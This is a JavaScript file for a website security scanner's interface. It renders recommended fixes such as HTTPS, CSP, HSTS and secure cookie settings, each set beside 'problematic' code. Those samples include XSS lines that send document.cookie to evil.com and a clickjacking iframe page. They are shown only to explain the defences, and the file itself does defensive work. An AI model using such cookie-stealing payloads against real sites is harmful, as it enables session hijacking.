/**
 * Security Fixes Renderer - Professional Card-Based Recommendations
 * Generates detailed, actionable security fixes with code examples
 * Matches the Performance Fixes style for consistency
 */

function renderSecurityFixes(recommendations, results) {
  const fixes = generateSecurityFixesData(recommendations, results);

  if (fixes.length === 0) {
    return `
      <div style="margin-top: 2rem; background: linear-gradient(135deg, rgba(34, 197, 94, 0.1), rgba(16, 185, 129, 0.05)); border: 1px solid rgba(34, 197, 94, 0.3); border-radius: 16px; padding: 2rem;">
        <h3 style="margin: 0 0 1rem 0; display: flex; align-items: center; gap: 0.5rem; color: #22c55e;">
          <span style="font-size: 1.5rem;">🛡️</span> Excellent! Your Site is Secure
        </h3>
        <p style="color: #86efac; margin: 0;">All security checks passed. Your site follows industry best practices for SSL, headers, and vulnerability prevention.</p>
      </div>
    `;
  }

  // Group by severity
  const critical = fixes.filter(f => f.severity === 'critical');
  const high = fixes.filter(f => f.severity === 'high');
  const medium = fixes.filter(f => f.severity === 'medium');
  const low = fixes.filter(f => f.severity === 'low');

  let html = `
    <div class="security-fixes-container" style="margin-top: 2rem;">
      <h3 style="margin: 0 0 1.5rem 0; display: flex; align-items: center; gap: 0.5rem; font-size: 1.35rem;">
        <span style="font-size: 1.75rem;">🔒</span> Security Fixes
        <span style="font-size: 0.875rem; color: #888; font-weight: normal;">(${fixes.length} issues found)</span>
      </h3>
      <div class="fixes-container">
  `;

  // Render critical fixes
  if (critical.length > 0) {
    html += `<div class="severity-group" style="margin-bottom: 1.5rem;">`;
    critical.forEach((fix, index) => {
      html += renderSecurityFixAccordion(fix, index);
    });
    html += `</div>`;
  }

  // Render high priority fixes
  if (high.length > 0) {
    html += `<div class="severity-group" style="margin-bottom: 1.5rem;">`;
    high.forEach((fix, index) => {
      html += renderSecurityFixAccordion(fix, critical.length + index);
    });
    html += `</div>`;
  }

  // Render medium priority fixes
  if (medium.length > 0) {
    html += `<div class="severity-group" style="margin-bottom: 1.5rem;">`;
    medium.forEach((fix, index) => {
      html += renderSecurityFixAccordion(fix, critical.length + high.length + index);
    });
    html += `</div>`;
  }

  // Render low priority fixes
  if (low.length > 0) {
    html += `<div class="severity-group">`;
    low.forEach((fix, index) => {
      html += renderSecurityFixAccordion(fix, critical.length + high.length + medium.length + index);
    });
    html += `</div>`;
  }

  html += `</div></div>`;

  return html;
}

function generateSecurityFixesData(recommendations, results) {
  const fixes = [];

  // Process each recommendation from the security analyzer
  if (recommendations && recommendations.length > 0) {
    recommendations.forEach(rec => {
      const fixData = createSecurityFix(rec, results);
      if (fixData) {
        fixes.push(fixData);
      }
    });
  }

  // Sort by severity
  const priorityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
  fixes.sort((a, b) => priorityOrder[a.severity] - priorityOrder[b.severity]);

  return fixes;
}

// eslint-disable-next-line no-unused-vars
function createSecurityFix(rec, results) {
  // results parameter reserved for future dynamic content based on scan results
  // Map recommendation to detailed fix with code examples
  const fixTemplates = {
    'Implement HTTPS': {
      icon: '🔴',
      category: 'SSL/TLS',
      impact: '+30 Security Score',
      summary: 'Your website is not using HTTPS encryption. All data including passwords, personal information, and payment details are transmitted in plain text, making them vulnerable to interception by attackers on the network.',
      problematicCode: `<!-- Current insecure setup -->
<a href="http://example.com/login">Login</a>

<!-- Server configuration (Apache) -->
<VirtualHost *:80>
    ServerName example.com
    DocumentRoot /var/www/html
</VirtualHost>

<!-- Issues: -->
<!-- ✗ Data transmitted in plain text -->
<!-- ✗ Vulnerable to man-in-the-middle attacks -->
<!-- ✗ Browser shows "Not Secure" warning -->
<!-- ✗ SEO penalty from Google -->`,
      fixedCode: `<!-- Secure HTTPS setup -->
<a href="https://example.com/login">Login</a>

<!-- Server configuration (Apache) -->
<VirtualHost *:443>
    ServerName example.com
    DocumentRoot /var/www/html
    
    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/example.com.crt
    SSLCertificateKeyFile /etc/ssl/private/example.com.key
    SSLCertificateChainFile /etc/ssl/certs/chain.crt
    
    # Modern SSL configuration
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:...
</VirtualHost>

<!-- Redirect HTTP to HTTPS -->
<VirtualHost *:80>
    ServerName example.com
    Redirect permanent / https://example.com/
</VirtualHost>

<!-- ✓ All traffic encrypted -->
<!-- ✓ Modern TLS protocols only -->
<!-- ✓ Automatic HTTP→HTTPS redirect -->`,
      steps: [
        'Get a free SSL certificate from Let\'s Encrypt using certbot',
        'Install the certificate and configure your web server',
        'Set up automatic HTTP → HTTPS redirect'
      ]
    },
    'Implement Content Security Policy': {
      icon: '🔴',
      category: 'Security Headers',
      impact: '+15 Security Score',
      summary: 'Your site lacks a Content Security Policy (CSP) header, leaving it vulnerable to Cross-Site Scripting (XSS) attacks. Attackers can inject malicious scripts that steal user data, hijack sessions, or deface your website.',
      problematicCode: `<!-- No CSP - Vulnerable to XSS -->
<script>
  // Attacker can inject:
  document.write('<img src="https://evil.com/steal?cookie=' + document.cookie + '">');
</script>

<!-- Inline scripts and eval() allowed -->
<button onclick="eval(userInput)">Submit</button>

<!-- External scripts from any source -->
<script src="https://random-cdn.com/malware.js"></script>

<!-- Issues: -->
<!-- ✗ Any script can execute -->
<!-- ✗ Inline event handlers allowed -->
<!-- ✗ eval() and similar functions enabled -->
<!-- ✗ No control over resource origins -->`,
      fixedCode: `<!-- Server header configuration -->
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';

<!-- HTML with nonce-based scripts -->
<script nonce="abc123">
  // Only scripts with valid nonce execute
  initializeApp();
</script>

<!-- Meta tag alternative -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">

<!-- ✓ Only trusted scripts execute -->
<!-- ✓ Inline scripts require nonce -->
<!-- ✓ Resource origins controlled -->`,
      steps: [
        'Start with <code>Content-Security-Policy-Report-Only</code> header to find issues',
        'Set <code>default-src \'self\'; script-src \'self\'</code> as your base policy',
        'Replace inline scripts/styles with external files or add nonces',
        'Switch to enforcing <code>Content-Security-Policy</code> header'
      ]
    },
    'Enable HTTP Strict Transport Security': {
      icon: '🟠',
      category: 'Security Headers',
      impact: '+10 Security Score',
      summary: 'HSTS header is not configured. Without HSTS, attackers can perform protocol downgrade attacks, forcing users to connect over insecure HTTP even when HTTPS is available.',
      problematicCode: `<!-- Without HSTS -->
<!-- User types: example.com -->
<!-- Browser connects via HTTP first -->
<!-- Attacker intercepts and blocks HTTPS redirect -->

<!-- Response headers (missing HSTS): -->
HTTP/1.1 301 Moved Permanently
Location: https://example.com/

<!-- Issues: -->
<!-- ✗ First request is always HTTP -->
<!-- ✗ Vulnerable to SSL stripping attacks -->
<!-- ✗ No browser enforcement of HTTPS -->`,
      fixedCode: `<!-- With HSTS enabled -->
<!-- Server response headers: -->
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

<!-- Apache configuration -->
<VirtualHost *:443>
    Header always set Strict-Transport-Security \\
        "max-age=31536000; includeSubDomains; preload"
</VirtualHost>

<!-- Nginx configuration -->
server {
    listen 443 ssl;
    add_header Strict-Transport-Security 
        "max-age=31536000; includeSubDomains; preload" always;
}

<!-- ✓ Browser remembers HTTPS requirement -->
<!-- ✓ Automatic HTTPS for 1 year -->
<!-- ✓ All subdomains protected -->`,
      steps: [
        'Verify HTTPS works on all pages first',
        'Add <code>Strict-Transport-Security: max-age=300</code> and test',
        'Increase to <code>max-age=31536000; includeSubDomains</code> after testing'
      ]
    },
    'Prevent Clickjacking Attacks': {
      icon: '🟡',
      category: 'Security Headers',
      impact: '+5 Security Score',
      summary: 'X-Frame-Options header is not set. Attackers can embed your site in a hidden iframe and trick users into clicking buttons they didn\'t intend to, potentially changing settings or making purchases.',
      problematicCode: `<!-- Without X-Frame-Options -->
<!-- Attacker's malicious page: -->
<style>
  iframe { opacity: 0; position: absolute; }
  .fake-button { position: absolute; z-index: 1; }
</style>

<button class="fake-button">Win a Prize!</button>
<iframe src="https://yoursite.com/settings/delete-account"></iframe>

<!-- User clicks "Win a Prize" but actually clicks -->
<!-- the invisible "Delete Account" button -->

<!-- Issues: -->
<!-- ✗ Site can be embedded in any iframe -->
<!-- ✗ Clickjacking attacks possible -->
<!-- ✗ User actions can be hijacked -->`,
      fixedCode: `<!-- With X-Frame-Options -->
<!-- Server response headers: -->
X-Frame-Options: DENY
<!-- or -->
X-Frame-Options: SAMEORIGIN

<!-- Apache configuration -->
Header always set X-Frame-Options "DENY"

<!-- Nginx configuration -->
add_header X-Frame-Options "DENY" always;

<!-- Modern CSP alternative (recommended) -->
Content-Security-Policy: frame-ancestors 'none';
<!-- or for same-origin only: -->
Content-Security-Policy: frame-ancestors 'self';

<!-- ✓ Site cannot be embedded in iframes -->
<!-- ✓ Clickjacking attacks prevented -->
<!-- ✓ CSP provides more granular control -->`,
      steps: [
        'Add header: <code>X-Frame-Options: DENY</code> to your server config',
        'Also add CSP: <code>frame-ancestors \'none\'</code> for modern browsers'
      ]
    },
    'Prevent MIME Sniffing': {
      icon: '🟡',
      category: 'Security Headers',
      impact: '+5 Security Score',
      summary: 'X-Content-Type-Options header is missing. Browsers may misinterpret file types, potentially executing uploaded files as scripts even if they have a different extension.',
      problematicCode: `<!-- Without X-Content-Type-Options -->
<!-- Attacker uploads malicious.txt containing: -->
<script>alert('XSS')</script>

<!-- Server responds with: -->
Content-Type: text/plain

<!-- But browser "sniffs" content and might execute as HTML/JS -->
<!-- if it detects script-like content -->

<!-- Issues: -->
<!-- ✗ Browser may ignore Content-Type -->
<!-- ✗ Text files could execute as scripts -->
<!-- ✗ Uploads become security risks -->`,
      fixedCode: `<!-- With X-Content-Type-Options -->
<!-- Server response headers: -->
X-Content-Type-Options: nosniff

<!-- Apache configuration -->
Header always set X-Content-Type-Options "nosniff"

<!-- Nginx configuration -->
add_header X-Content-Type-Options "nosniff" always;

<!-- Express.js -->
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});

<!-- ✓ Browser strictly follows Content-Type -->
<!-- ✓ No MIME sniffing vulnerabilities -->
<!-- ✓ Uploaded files stay as declared type -->`,
      steps: [
        'Add header: <code>X-Content-Type-Options: nosniff</code> to all responses',
        'Ensure your server sends correct Content-Type for all files',
        'Test file downloads and uploads work correctly after implementation'
      ]
    },
    'Improve Cookie Security': {
      icon: '🟠',
      category: 'Cookies',
      impact: '+10 Security Score',
      summary: 'Cookies are not properly secured. Session cookies without HttpOnly, Secure, and SameSite flags are vulnerable to theft via XSS attacks and cross-site request forgery.',
      problematicCode: `<!-- Insecure cookie settings -->
Set-Cookie: session=abc123

<!-- JavaScript can access cookies -->
<script>
  // Attacker steals session via XSS:
  new Image().src = 'https://evil.com/steal?c=' + document.cookie;
</script>

<!-- Cookie sent over HTTP -->
<!-- Cookie sent with cross-site requests -->

<!-- Issues: -->
<!-- ✗ No HttpOnly - accessible via JavaScript -->
<!-- ✗ No Secure - sent over HTTP -->
<!-- ✗ No SameSite - CSRF vulnerable -->`,
      fixedCode: `<!-- Secure cookie settings -->
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

<!-- Express.js session configuration -->
app.use(session({
  cookie: {
    httpOnly: true,    // Blocks JavaScript access
    secure: true,      // HTTPS only
    sameSite: 'strict', // No cross-site sending
    maxAge: 3600000    // 1 hour expiry
  }
}));

<!-- PHP configuration -->
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = Strict

<!-- ✓ Protected from XSS cookie theft -->
<!-- ✓ Only sent over HTTPS -->
<!-- ✓ CSRF attacks prevented -->`,
      steps: [
        'Add <code>HttpOnly; Secure; SameSite=Lax</code> flags to all session cookies',
        'Update your session library or framework configuration',
        'Test login/logout functionality still works'
      ]
    },
    'Add Subresource Integrity': {
      icon: '🟡',
      category: 'Third-Party Scripts',
      impact: '+8 Security Score',
      summary: 'Third-party scripts are loaded without integrity verification. If the CDN is compromised, malicious code could be injected into your site without detection.',
      problematicCode: `<!-- Loading external scripts without SRI -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
<link href="https://cdn.example.com/bootstrap.min.css" rel="stylesheet">

<!-- If CDN is compromised, malicious code executes -->
<!-- No way to verify file hasn't been modified -->

<!-- Issues: -->
<!-- ✗ No integrity verification -->
<!-- ✗ CDN compromise affects your site -->
<!-- ✗ Supply chain attack vulnerability -->`,
      fixedCode: `<!-- With Subresource Integrity (SRI) -->
<script 
  src="https://cdn.example.com/jquery-3.6.0.min.js"
  integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
  crossorigin="anonymous">
</script>

<link 
  href="https://cdn.example.com/bootstrap.min.css"
  rel="stylesheet"
  integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3"
  crossorigin="anonymous">

<!-- Generate SRI hash: -->
<!-- openssl dgst -sha384 -binary FILE | openssl base64 -A -->

<!-- ✓ Browser verifies file integrity -->
<!-- ✓ Modified files are blocked -->
<!-- ✓ Supply chain attacks prevented -->`,
      steps: [
        'Generate SRI hashes at srihash.org for each external script/stylesheet',
        'Add <code>integrity</code> and <code>crossorigin="anonymous"</code> attributes',
        'Update hashes whenever you upgrade library versions'
      ]
    }
  };

  // Find matching template or create generic one
  let template = null;
  for (const [key, value] of Object.entries(fixTemplates)) {
    if (rec.title.toLowerCase().includes(key.toLowerCase()) || 
        key.toLowerCase().includes(rec.title.toLowerCase().split(' ').slice(0, 3).join(' '))) {
      template = value;
      break;
    }
  }

  // If no specific template, create a generic one
  if (!template) {
    template = createGenericSecurityFix(rec);
  }

  return {
    id: `security-${rec.title.toLowerCase().replace(/[^a-z0-9]/g, '-')}`,
    severity: rec.priority || 'medium',
    icon: template.icon || (rec.priority === 'critical' ? '🔴' : rec.priority === 'high' ? '🟠' : '🟡'),
    title: rec.title,
    subtitle: rec.owaspRef || 'Security Best Practice',
    category: template.category || 'Security',
    impact: template.impact || '+5 Security Score',
    summary: template.summary || rec.description,
    problematicCode: template.problematicCode || `<!-- Current issue -->\n${rec.description}`,
    fixedCode: template.fixedCode || `<!-- Recommended fix -->\n${rec.solution || 'Implement security best practices'}`,
    resources: rec.resources || [],
    steps: template.steps || [rec.solution || 'Follow security best practices'],
    proSteps: template.proSteps || []
  };
}

function createGenericSecurityFix(rec) {
  return {
    icon: rec.priority === 'critical' ? '🔴' : rec.priority === 'high' ? '🟠' : '🟡',
    category: 'Security',
    impact: rec.priority === 'critical' ? '+15 Security Score' : rec.priority === 'high' ? '+10 Security Score' : '+5 Security Score',
    summary: rec.description || 'A security issue was detected that needs attention.',
    problematicCode: `<!-- Security Issue Detected -->
<!-- ${rec.title} -->

${rec.description || 'Issue details not available'}

<!-- Impact: -->
<!-- ${rec.impact || 'May affect site security'} -->`,
    fixedCode: `<!-- Recommended Solution -->
<!-- ${rec.title} -->

${rec.solution || 'Implement the recommended security measures'}

<!-- Benefits: -->
<!-- ✓ Improved security posture -->
<!-- ✓ Reduced attack surface -->
<!-- ✓ Industry best practices -->`,
    steps: [
      rec.solution || 'Review and implement security recommendations',
      'Test changes in a staging environment first',
      'Deploy to production and verify the fix'
    ]
  };
}

function renderSecurityFixAccordion(fix, index) {
  const accordionId = `secfix-${fix.id}-${index}`;
  const severityClass = `severity-${fix.severity}`;

  return `
    <div class="fix-accordion ${severityClass}" data-fix-id="${accordionId}">
      <div class="fix-header" onclick="toggleSecurityFixAccordion('${accordionId}')">
        <div class="fix-header-left">
          <span class="fix-icon">${fix.icon}</span>
          <div class="fix-title-group">
            <h4 class="fix-title">${fix.title}</h4>
            <p class="fix-subtitle">${fix.subtitle}</p>
          </div>
        </div>
        <div class="fix-badges">
          <span class="fix-badge priority-${fix.severity}">${fix.severity.toUpperCase()}</span>
          <span class="fix-badge category">${fix.category}</span>
          <span class="fix-expand-icon">▼</span>
        </div>
      </div>

      <div class="fix-content" id="${accordionId}-content">
        <div class="fix-content-inner">
          ${renderSecurityFixTabs(fix, accordionId)}
        </div>
      </div>
    </div>
  `;
}

function renderSecurityFixTabs(fix, accordionId) {
  return `
    <div class="fix-tabs">
      <button class="fix-tab active" onclick="switchSecurityFixTab('${accordionId}', 'summary')">
        📋 Summary
      </button>
      <button class="fix-tab" onclick="switchSecurityFixTab('${accordionId}', 'code')">
        💻 Code
      </button>
      ${fix.resources && fix.resources.length > 0 ? `<button class="fix-tab" onclick="switchSecurityFixTab('${accordionId}', 'resources')">📚 Resources</button>` : ''}
      <button class="fix-tab" onclick="switchSecurityFixTab('${accordionId}', 'guide')">
        🔧 Fix Guide
      </button>
    </div>

    <!-- Summary Tab -->
    <div class="fix-tab-content active" id="${accordionId}-summary">
      <p style="color: #ccc; line-height: 1.7; margin-bottom: 1rem;">
        ${fix.summary}
      </p>
      <div class="impact-indicator">
        <div>
          <div class="impact-value">${fix.impact}</div>
          <div class="impact-label">Estimated Improvement</div>
        </div>
      </div>
    </div>

    <!-- Code Tab -->
    <div class="fix-tab-content" id="${accordionId}-code">
      <div class="code-comparison">
        <div class="code-block">
          <div class="code-block-header">
            <span class="code-block-title error">
              ❌ Current Issue
            </span>
            <button class="fix-btn-secondary" style="padding: 0.375rem 0.75rem; font-size: 0.75rem;" onclick="copySecurityCode('${accordionId}-problem')">
              📋 Copy
            </button>
          </div>
          <div class="code-block-body">
            <pre id="${accordionId}-problem">${escapeSecurityHtml(fix.problematicCode)}</pre>
          </div>
        </div>

        <div class="code-block" style="position: relative;">
          <div class="code-block-header">
            <span class="code-block-title success">
              ✅ Secure Solution
            </span>
            <button class="fix-btn-secondary" style="padding: 0.375rem 0.75rem; font-size: 0.75rem;" onclick="copySecurityCode('${accordionId}-solution')">
              📋 Copy
            </button>
          </div>
          <div class="code-block-body">
            <pre id="${accordionId}-solution">${escapeSecurityHtml(fix.fixedCode)}</pre>
          </div>
        </div>
      </div>
    </div>

    ${fix.resources && fix.resources.length > 0 ? `
    <!-- Resources Tab -->
    <div class="fix-tab-content" id="${accordionId}-resources">
      <h5 style="margin: 0 0 1rem 0; color: #fff;">Learn More:</h5>
      <ul class="resources-list" style="list-style: none; padding: 0; margin: 0;">
        ${fix.resources.map(r => `
          <li style="margin-bottom: 0.75rem;">
            <a href="${r.url}" target="_blank" rel="noopener noreferrer" 
               style="color: var(--accent-primary); text-decoration: none; display: flex; align-items: center; gap: 0.5rem;">
              <span>📄</span>
              <span>${r.title}</span>
              <span style="font-size: 0.75rem; opacity: 0.7;">↗</span>
            </a>
          </li>
        `).join('')}
      </ul>
    </div>
    ` : ''}

    <!-- Fix Guide Tab -->
    <div class="fix-tab-content" id="${accordionId}-guide">
      <h5 style="margin: 0 0 1rem 0; color: #fff;">Step-by-Step Fix:</h5>
      <ol style="margin: 0; padding-left: 1.5rem; color: #ccc; line-height: 1.8;">
        ${[...fix.steps, ...(fix.proSteps || [])].map(step => `<li style="margin-bottom: 0.75rem;">${step}</li>`).join('')}
      </ol>

      <div class="fix-actions" style="margin-top: 1.5rem; display: flex; gap: 0.75rem; flex-wrap: wrap;">
        <button class="fix-btn fix-btn-primary" style="padding: 0.625rem 1.25rem; background: var(--accent-primary); color: #000; border: none; border-radius: 6px; font-weight: 600; cursor: pointer;" onclick="window.open('https://developer.mozilla.org/en-US/docs/Web/Security', '_blank')">
          📚 Security Docs
        </button>
        <button class="fix-btn fix-btn-secondary" style="padding: 0.625rem 1.25rem; background: transparent; border: 1px solid rgba(255,255,255,0.2); color: #ccc; border-radius: 6px; font-weight: 500; cursor: pointer;" onclick="window.open('https://securityheaders.com/', '_blank')">
          🧪 Test Headers
        </button>
      </div>
    </div>
  `;
}

function escapeSecurityHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Accordion toggle function
function toggleSecurityFixAccordion(accordionId) {
  const accordion = document.querySelector(`[data-fix-id="${accordionId}"]`);
  const content = document.getElementById(`${accordionId}-content`);

  if (!accordion || !content) return;

  const isExpanded = accordion.classList.contains('expanded');

  if (isExpanded) {
    accordion.classList.remove('expanded');
    content.style.maxHeight = '0';
  } else {
    accordion.classList.add('expanded');
    content.style.maxHeight = content.scrollHeight + 'px';
    setTimeout(() => {
      content.style.maxHeight = content.scrollHeight + 'px';
    }, 50);
  }
}

// Tab switching function
function switchSecurityFixTab(accordionId, tabName) {
  const accordion = document.querySelector(`[data-fix-id="${accordionId}"]`);
  if (!accordion) return;

  const tabs = accordion.querySelectorAll('.fix-tab');
  const contents = accordion.querySelectorAll('.fix-tab-content');

  tabs.forEach(tab => tab.classList.remove('active'));
  contents.forEach(content => content.classList.remove('active'));

  const activeTab = Array.from(tabs).find(tab => tab.textContent.toLowerCase().includes(tabName));
  const activeContent = document.getElementById(`${accordionId}-${tabName}`);

  if (activeTab) activeTab.classList.add('active');
  if (activeContent) activeContent.classList.add('active');

  const content = document.getElementById(`${accordionId}-content`);
  if (content && accordion.classList.contains('expanded')) {
    setTimeout(() => {
      content.style.maxHeight = content.scrollHeight + 'px';
    }, 50);
  }
}

// Copy code function
function copySecurityCode(elementId) {
  const codeElement = document.getElementById(elementId);
  if (!codeElement) return;

  const text = codeElement.textContent;

  navigator.clipboard.writeText(text).then(() => {
    const button = event.target;
    const originalText = button.textContent;
    button.textContent = '✓ Copied!';
    button.style.background = 'rgba(34, 197, 94, 0.2)';
    button.style.borderColor = '#22c55e';
    button.style.color = '#22c55e';

    setTimeout(() => {
      button.textContent = originalText;
      button.style.background = '';
      button.style.borderColor = '';
      button.style.color = '';
    }, 2000);
  }).catch(err => {
    console.error('Failed to copy:', err);
  });
}

// Make functions globally available
window.toggleSecurityFixAccordion = toggleSecurityFixAccordion;
window.switchSecurityFixTab = switchSecurityFixTab;
window.copySecurityCode = copySecurityCode;
window.renderSecurityFixes = renderSecurityFixes;
